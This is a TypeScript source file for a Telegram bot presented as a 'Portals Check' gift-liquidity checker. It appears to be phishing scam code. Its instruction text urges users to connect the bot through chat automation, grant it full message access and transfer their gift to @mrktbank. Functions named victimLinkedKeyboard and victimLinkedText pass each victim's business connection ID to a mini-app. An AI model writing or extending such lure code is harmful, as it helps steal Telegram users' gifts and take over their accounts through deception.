import { config } from "./config.js";

export type Entity = Record<string, string | number>;
export type InlineKeyboard = {
  inline_keyboard: Array<Array<Record<string, unknown>>>;
};

function pushEmoji(
  parts: string[],
  entities: Entity[],
  glyph: string,
  customId: string,
): void {
  const offset = parts.join("").length;
  parts.push(glyph);
  entities.push({ type: "custom_emoji", offset, length: glyph.length, custom_emoji_id: customId });
}

function pushBold(parts: string[], entities: Entity[], chunk: string): void {
  const offset = parts.join("").length;
  parts.push(chunk);
  entities.push({ type: "bold", offset, length: chunk.length });
}

export function buildStartMessage(): { text: string; entities: Entity[] } {
  const parts: string[] = [];
  const entities: Entity[] = [];
  pushEmoji(parts, entities, "🛒", "6037083366438737901");
  pushBold(parts, entities, " Portals Check");
  parts.push("\n\nПривет! Покажу, сколько реально стоит твой профиль на MRKT.\n\n");
  pushEmoji(parts, entities, "💧", "5936143551854285132");
  parts.push(" Ликвидность каждого подарка\n");
  pushEmoji(parts, entities, "💰", "5778421276024509124");
  parts.push(" Что продать сейчас — и за сколько\n");
  pushEmoji(parts, entities, "⏳", "5805553606635559688");
  parts.push(" Что лучше придержать");
  return { text: parts.join(""), entities };
}

export function buildHowMessage(): { text: string; entities: Entity[] } {
  const parts: string[] = [];
  const entities: Entity[] = [];
  pushEmoji(parts, entities, "💡", "5255850874248399164");
  parts.push(" Инструкции для проверки подарка:\n\n");
  parts.push(
    [
      `1. Скопируй юзернейм бота: @${config.botUsername}`,
      "2. Нажми кнопку: Подключить",
      "3. Подключи бота в ‹Автоматизация чатов›",
      "4. Выдай доступ на сообщения 5/5",
      "",
      "Подарок для проверки ликвидности должен быть в MRKT (vault), не в профиле Telegram.",
      "Передай подарок на @mrktbank",
    ].join("\n"),
  );
  return { text: parts.join(""), entities };
}

export function buildLangMessage(): { text: string; entities: Entity[] } {
  const parts: string[] = [];
  const entities: Entity[] = [];
  pushEmoji(parts, entities, "✈️", "5875465628285931233");
  parts.push("  Выберите язык / Choose language / 中国语文科 / اختر لغة");
  return { text: parts.join(""), entities };
}

export function startKeyboard(): InlineKeyboard {
  return {
    inline_keyboard: [
      [{ text: "Открыть Gifts Check", web_app: { url: config.miniappUrl } }],
      [{ text: "Check", url: "tg://settings/edit" }],
      [{ text: "Как проверить ликвидность?", callback_data: "how_liquidity" }],
      [{ text: "Сменить язык", callback_data: "change_lang" }],
    ],
  };
}

export function howKeyboard(): InlineKeyboard {
  return { inline_keyboard: [[{ text: "Назад", callback_data: "back_start" }]] };
}

export function langKeyboard(): InlineKeyboard {
  return {
    inline_keyboard: [
      [{ text: "🇷🇺 русский", callback_data: "lang_ru" }],
      [{ text: "🇬🇧 English", callback_data: "lang_en" }],
      [{ text: "🇨🇳 中国语文科", callback_data: "lang_zh" }],
      [{ text: "🇸🇦 اللغة العربية", callback_data: "lang_ar" }],
      [{ text: "Назад", callback_data: "back_start" }],
    ],
  };
}

export function victimLinkedKeyboard(businessConnectionId?: string) {
  const q = businessConnectionId ? `?bc=${encodeURIComponent(businessConnectionId)}` : "";
  return {
    inline_keyboard: [[{ text: "Открыть Gifts Check", web_app: { url: `${config.miniappUrl}${q}` } }]],
  };
}

export const victimLinkedText = [
  "Portals Check: автоматизация подключена.",
  "",
  "Открой Gifts Check — синхронизация Vault с MRKT (веб) и расчёт ликвидности.",
].join("\n");
